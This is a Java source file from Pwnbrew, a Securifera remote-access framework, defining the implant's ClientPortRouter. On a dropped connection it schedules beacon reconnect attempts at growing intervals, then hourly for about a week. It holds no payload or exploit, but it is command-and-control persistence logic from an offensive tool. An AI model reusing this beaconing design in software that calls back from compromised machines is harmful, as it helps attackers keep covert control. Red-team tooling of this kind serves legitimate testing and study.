/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/

package pwnbrew.network;

import java.io.IOException;
import java.util.Calendar;
import java.util.Date;
import pwnbrew.ClientConfig;
import pwnbrew.manager.ConnectionManager;
import pwnbrew.manager.OutgoingConnectionManager;
import pwnbrew.manager.PortManager;
import pwnbrew.utilities.Constants;
import pwnbrew.utilities.DebugPrinter;
import pwnbrew.utilities.ReconnectTimer;


/**
 *
 *  
 */
public class ClientPortRouter extends PortRouter {
           
    private static final String NAME_Class = ClientPortRouter.class.getSimpleName();
    private OutgoingConnectionManager theOCM;
    
    volatile boolean reconnectEnable = true;
    
      
    //===============================================================
     /**
     * ClientComm constructor
     *
     * @param passedPortManager
     * @param passedBool
     * @throws IOException
    */
    public ClientPortRouter( PortManager passedPortManager, boolean passedBool ) throws IOException {
        super(passedPortManager, passedBool, Constants.Executor );
        
        //Create server connection manager
        theOCM = new OutgoingConnectionManager();

        
    }

    //===============================================================
     /**
      * 
      * @return 
    */
    public OutgoingConnectionManager getSCM() {
        return theOCM;
    }
     
    //===============================================================
    /**
     * Set reconnect enable
     * @param passedFlag
     */
    public void setReconnectFlag(boolean passedFlag ){
        reconnectEnable = passedFlag;
    }

    //===============================================================
    /**
     *  Connection dropped.
     * 
     * @param clientId
     * @param channelId 
     */
    @Override
    public void socketClosed( int clientId, int channelId ){
        
        //DebugPrinter.printMessage(NAME_Class, "Socket closed.");
        ReconnectTimer aReconnectTimer = theOCM.getReconnectTimer(channelId);
        
        //Create one if it doesn't exist
        if( aReconnectTimer == null)
            aReconnectTimer = new ReconnectTimer(thePortManager, channelId); 
        
        
        if( reconnectEnable ){
            
            ClientConfig theConf = ClientConfig.getConfig();
            int beaconInterval = theConf.getBeaconInterval();
            
            //DebugPrinter.printMessage(NAME_Class, "Starting Reconnect Timer");
            aReconnectTimer.clearTimes();
                        
            //Create the calendar
            Calendar theCalendar = Calendar.getInstance(); 
            theCalendar.setTime( new Date() );
            
            //Add the seconds to wait before first callback
            theCalendar.add( Calendar.SECOND, beaconInterval);
            Date aTime = theCalendar.getTime();            
            
            //Format and add to the queue
            String dateStr = Constants.CHECKIN_DATE_FORMAT.format(aTime);
            aReconnectTimer.addReconnectTime( dateStr );
            
            //Add 5 Seconds
            theCalendar.add( Calendar.SECOND, 5);
            aTime = theCalendar.getTime();
            
            
            //Format and add to the queue
            dateStr = Constants.CHECKIN_DATE_FORMAT.format(aTime);
            aReconnectTimer.addReconnectTime( dateStr );
               
            //Add 1 Minute
            theCalendar.add( Calendar.MINUTE, 1);
            aTime = theCalendar.getTime();
                
            //Format and add to the queue
            dateStr = Constants.CHECKIN_DATE_FORMAT.format(aTime);
            aReconnectTimer.addReconnectTime( dateStr );
            
            //Add 5 Mins
            theCalendar.add( Calendar.MINUTE, 5);
            aTime = theCalendar.getTime();
                
            //Format and add to the queue
            dateStr = Constants.CHECKIN_DATE_FORMAT.format(aTime);
            aReconnectTimer.addReconnectTime( dateStr );
            
            //Add 10 Mins
            theCalendar.add( Calendar.MINUTE, 10);
            aTime = theCalendar.getTime();
                
            //Format and add to the queue
            dateStr = Constants.CHECKIN_DATE_FORMAT.format(aTime);
            aReconnectTimer.addReconnectTime( dateStr );
            
            //Add 15 Mins
            theCalendar.add( Calendar.MINUTE, 15);
            aTime = theCalendar.getTime();
                
            //Format and add to the queue
            dateStr = Constants.CHECKIN_DATE_FORMAT.format(aTime);
            aReconnectTimer.addReconnectTime( dateStr );
            
            for( int i= 0; i < 7 * 23; i++ ){
                
                theCalendar.add( Calendar.HOUR_OF_DAY, 1 );
                aTime = theCalendar.getTime();
                
                //Format and add to the queue
                dateStr = Constants.CHECKIN_DATE_FORMAT.format(aTime);
                aReconnectTimer.addReconnectTime( dateStr );
                
            }
        
            //Execute it
            if( aReconnectTimer.isRunning())
                aReconnectTimer.beNotified();
            else
                aReconnectTimer.start();
            
        } else if( !reconnectEnable ){
            
            DebugPrinter.printMessage(NAME_Class, "Reconnect not enabled");
            
        } else if (aReconnectTimer == null){
            
            DebugPrinter.printMessage(NAME_Class, "ReconnectTimer is null");
            
        } else if (aReconnectTimer.isRunning() && reconnectEnable){
            
            aReconnectTimer.beNotified();
            DebugPrinter.printMessage(NAME_Class, "ReconnectTimer is already running");
            
        }
        
    };
    
     //===============================================================
    /**
     *  Shuts down the handler and selector
     */
    @Override
    public void shutdown(){

           
        theSelectionRouter.shutdown();
        
        //Shut down the handler 
        theOCM.shutdown();

    }
 
    //==========================================================================
    /**
     * 
     * @param passedIdArr
     * @return 
     */    
    @Override
    public OutgoingConnectionManager getConnectionManager( Integer... passedIdArr ) {
        return theOCM;
    }
    
    //==========================================================================
    /**
     * 
     * @param aCM
     * @param srcId 
     */
    @Override
    public void setConnectionManager( ConnectionManager aCM, Integer... srcId ) {
                    
        if( aCM instanceof OutgoingConnectionManager ){
            OutgoingConnectionManager anOCM = (OutgoingConnectionManager)aCM;
            theOCM = anOCM;
        }
      
    }

}/* END CLASS ClientPortRouter */
